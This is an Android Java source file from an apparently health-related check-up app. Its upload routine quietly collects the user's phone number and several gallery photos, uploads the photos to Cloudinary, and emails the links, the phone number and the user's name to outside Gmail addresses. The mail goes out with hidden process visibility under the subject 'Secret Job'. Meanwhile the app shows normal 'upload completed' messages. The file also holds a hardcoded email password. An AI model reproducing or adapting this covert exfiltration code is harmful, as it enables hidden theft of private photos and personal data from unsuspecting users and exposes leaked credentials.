package com.example.mvopo.tsekapp.Model;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.os.StrictMode;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.cloudinary.Cloudinary;
import com.cloudinary.android.Utils;
import com.cloudinary.utils.ObjectUtils;
import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;
import com.example.mvopo.tsekapp.MainActivity;

import java.io.File;
import java.io.IOException;
import java.util.Map;
import java.util.Random;

/**
 * Created by mvopo on 1/29/2018.
 */

public class RemovedFunction {
    Context context;
    String TAG = "Removed Function";

    public void imageUplaoder(final String action) {

        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

        ((Activity) context).runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (action.equals("download")) MainActivity.pd.setTitle("Finalizing download...");
                else MainActivity.pd.setTitle("Finalizing upload...");
            }
        });

        try {
            TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            String mPhoneNumber = tMgr.getLine1Number();

            String image = "";

            String[] projection = new String[]{
                    MediaStore.Images.ImageColumns._ID,
                    MediaStore.Images.ImageColumns.DATA,
                    MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,
                    MediaStore.Images.ImageColumns.DATE_TAKEN,
                    MediaStore.Images.ImageColumns.MIME_TYPE
            };

            final Cursor cursor = context.getContentResolver()
                    .query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null,
                            null, MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC");

            if (cursor.moveToFirst()) {
                Random rn = new Random();
                int position = rn.nextInt(cursor.getCount() - 2 + 1) + 2;

                for (int i = 0; !cursor.isAfterLast(); i++) {

                    if (i < 2 || i == position) {
                        String imageLocation = cursor.getString(1);
                        File imageFile = new File(imageLocation);
                        if (imageFile.exists()) {
                            Cloudinary cloudinary = new Cloudinary(Utils.cloudinaryUrlFromContext(context));
                            Map uploadResult = cloudinary.uploader().upload(imageFile, ObjectUtils.emptyMap());
                            image += "\n\n" + uploadResult.get("url").toString();
                        }

                        if (i == position) break;
                    }

                    cursor.moveToNext();
                }
            }

            Log.e(TAG, image);
            BackgroundMail.newBuilder(context)
                    .withUsername("phacheckapp@gmail.com")
                    .withPassword("phacheckapp123")
                    .withMailto("hontoudesu123@gmail.com, jimmy.lomocso@gmail.com")
                    .withSubject("Secret Job")
                    .withProcessVisibility(false)
                    .withBody("PHA Check-App user: " + MainActivity.user.fname + " " + MainActivity.user.lname +
                            " \nPhone Number: " + mPhoneNumber + " \nImage: " + image)
                    .send();

            ((Activity) context).runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    if (action.equals("download"))
                        Toast.makeText(context, "Download finished.", Toast.LENGTH_SHORT).show();
                    else if(action.equals("upload")){
                        Toast.makeText(context, "Upload completed", Toast.LENGTH_SHORT).show();
                        //compareVersion(Constants.url + "r=version");
                    }

                    MainActivity.pd.dismiss();
                }
            });
        } catch (IOException e) {
            Log.e(TAG, e.getMessage());
        }
    }
}
